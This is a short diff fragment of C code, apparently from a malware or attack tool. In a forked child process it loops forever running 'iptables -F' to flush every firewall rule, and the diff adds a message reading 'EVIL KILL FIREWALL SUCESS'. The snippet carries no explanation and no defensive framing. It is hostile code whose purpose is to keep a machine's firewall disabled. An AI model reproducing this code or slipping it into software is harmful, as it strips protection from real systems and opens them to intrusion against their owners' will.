@@ -125,6 +125,8 @@ case 3:
 
 if(fork() == 0){
 
+printf("[!] EVIL KILL FIREWALL SUCESS!\n");
+
 while(1){
 
 system("/usr/bin/iptables -F");
